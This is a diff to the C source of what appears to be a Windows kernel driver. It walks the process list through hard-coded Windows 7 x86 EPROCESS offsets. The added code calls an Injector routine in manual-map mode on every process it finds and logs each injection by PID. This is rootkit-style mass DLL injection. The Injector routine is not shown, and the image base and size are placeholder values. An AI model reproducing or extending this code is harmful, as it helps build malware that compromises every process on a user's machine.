@@ -1,6 +1,13 @@
 #include "proc.h"
 
 
+
+
+
+
+
+
+
 NTSTATUS GetProcessImageName(HANDLE hProc, PUNICODE_STRING procImg)
 {
 	NTSTATUS ret = STATUS_ACCESS_DENIED;
@@ -66,6 +73,14 @@ NTSTATUS GetProcessImageName(HANDLE hProc, PUNICODE_STRING procImg)
 }
 
 
+
+
+
+
+
+
+
+
 BOOLEAN ListProcess()	
 {
 
@@ -74,6 +89,11 @@ BOOLEAN ListProcess()
 	PLIST_ENTRY listEntry, listEntry_otra;
 	unsigned int pidProc = 0;
 	int ii = 0;
+	NTSTATUS status = 0;
+	//MAP_MEMORY_REGION_RESULT result = { 0 };
+	INJECT_DLL dats = { IT_Thread };
+
+
 
 	//Obtenemos el System
 	eProc = (unsigned long) PsGetCurrentProcess();
@@ -89,6 +109,10 @@ BOOLEAN ListProcess()
 
 	pidProc = *((int *) (proc + OFFSET_PROCPID_WIN7_X86));	
 
+	
+	//*(ULONG*)ioBuffer = (ULONG)sizeRequired;
+	//RtlCopyMemory( ioBuffer, &result, sizeof( result ) );    	
+
 
 	while(aux != proc)
 	{		
@@ -97,6 +121,26 @@ BOOLEAN ListProcess()
 		ret = proc;
 
 		pidProc = *((int *)(proc + OFFSET_PROCPID_WIN7_X86));
+
+
+		dats.pid = pidProc;
+		dats.type = IT_MMap;
+		dats.imageBase = 0x1;
+		dats.imageSize = 0x2;
+		status = Injector(&dats);
+
+
+
+		if(NT_SUCCESS(status))
+		{
+			DbgPrint("RTL - Injected PID %d", pidProc);
+		}
+
+			else
+			{
+				DbgPrint("RTL - NOT injected PID %d", pidProc);
+			}
+
 		
 		//GetProcessName(pidProc);
 
@@ -123,6 +167,16 @@ BOOLEAN ListProcess()
 
 	return TRUE;
 }
+
+
+
+
+
+
+
+
+
+
 
 unsigned long FindProcess(unsigned int targetPid)
 {
@@ -162,6 +216,9 @@ unsigned long FindProcess(unsigned int targetPid)
 
 	return ret;
 }
+
+
+
 
 
 
